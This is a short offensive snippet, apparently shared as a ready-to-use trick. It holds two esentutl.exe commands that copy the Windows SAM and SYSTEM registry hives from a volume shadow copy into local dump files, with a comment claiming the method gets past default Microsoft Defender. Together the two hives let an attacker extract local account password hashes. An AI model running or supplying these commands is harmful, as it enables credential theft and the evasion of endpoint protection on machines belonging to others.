# straight forward but works on Defender default as of 2027-04-27
esentutl.exe /y /vss C:\Windows\System32\config\SAM    /d .\sam_dump
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d .\sys_dump
